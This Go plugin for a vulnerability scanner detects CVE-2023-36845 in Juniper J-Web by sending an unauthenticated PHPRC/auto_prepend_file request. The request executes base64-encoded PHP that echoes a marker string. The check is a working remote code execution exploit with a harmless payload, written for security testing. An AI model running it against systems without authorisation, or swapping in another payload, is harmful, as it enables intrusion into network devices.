package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("juniper_rce_cve_2023_36845", &juniper_rce_cve_2023_36845{})
}

type juniper_rce_cve_2023_36845 struct{}

func (p *juniper_rce_cve_2023_36845) Info() PluginInfo {
	return PluginInfo{
		Name:     "Juniper June OS PHP参数修改漏洞",
		VulnInfo: "Juniper Networks Junos OS在EX Series 和SRX Series上的J-Web存在一个PHP外部变量修改漏洞，允许未经身份验证的网络攻击者控制某些重要的环境变量。",
		VulnID:   "CVE-2023-36845",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "",
		CWE:      "CWE-473	PHP参数外部修改",
	}
}

func (p *juniper_rce_cve_2023_36845) Check(netloc string) bool {
	payload := "allow_url_include=1\r\nauto_prepend_file=\"data://text/plain;base64,PD9waHAgZWNobyBIYWNrQnlUcm9waW5lOz8+\""
	req, err := http.NewRequest("POST", netloc+"/?PHPRC=/dev/fd/0", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "HackByTropine") {
		return true
	}
	return false
}
